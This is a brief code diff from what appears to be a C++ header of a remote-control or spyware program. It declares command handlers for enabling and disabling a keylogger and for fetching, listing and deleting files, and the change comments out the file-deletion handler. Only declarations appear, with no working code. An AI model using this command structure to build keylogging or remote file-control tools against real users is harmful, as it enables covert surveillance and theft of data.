@@ -16,7 +16,7 @@
 int EnableKeyloggerHandler(const Message& inputMessage, Message& outputMessage);
 int DisableKeyloggerHandler(const Message& inputMessage, Message& outputMessage);
 int GetFileHandler(const Message& inputMessage, Message& outputMessage);
-int DeleteFileHandler(const Message& inputMessage, Message& outputMessage);
+// int DeleteFileHandler(const Message& inputMessage, Message& outputMessage);
 int ListFilehandler(const Message& inputMessage, Message& outputMessage);
 int ShutdownEngine(const Message& inputMessage, Message& outputMessage);
 int RestartEngine(const Message& inputMessage, Message& outputMessage);
